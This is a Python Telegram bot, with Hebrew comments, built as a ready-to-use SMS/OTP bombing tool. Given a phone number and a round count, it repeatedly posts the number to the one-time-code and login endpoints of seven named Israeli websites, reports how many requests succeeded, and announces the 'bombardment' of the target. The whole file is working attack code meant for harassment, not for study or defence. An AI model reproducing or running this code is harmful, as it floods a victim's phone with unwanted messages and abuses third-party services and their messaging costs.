import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- שים כאן את הטוקן המעודכן שלך ---
API_TOKEN = 'כאן_הטוקן_שלך' 
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    apis = [
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json"},
        {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Zygo", "u": "https://api.zygo.co.il/v1/auth/request-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"},
        {"n": "Onot", "u": "https://www.onot.co.il/customer/ajax/post/", "d": {"form_key": "cis1GHI1WxfdOMSR", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Gali", "u": "https://www.gali.co.il/customer/ajax/post/", "d": {"form_key": "OaMKKqrpQ3mzS4uo", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0"}

    for r in range(int(rounds)):
        success_count = 0
        for site in apis:
            try:
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
                if res.status_code in [200, 201]: success_count += 1
            except: pass
            time.sleep(0.1)
        
        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {success_count}/{len(apis)}")
        if r < int(rounds) - 1:
            time.sleep(1.5)

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2:
            rounds, target = parts[0], parts[1]
            if rounds.isdigit() and target.isdigit():
                bot.reply_to(m, f"🔥 הפצצה על {target} התחילה!")
                attack(m, target, rounds)
    except: pass

if __name__ == "__main__":
    keep_alive()
    print("Bot is starting...")
    while True:
        try:
            # הפעלה בסיסית בלי פרמטרים שמתנגשים
            bot.polling(interval=0, timeout=20)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
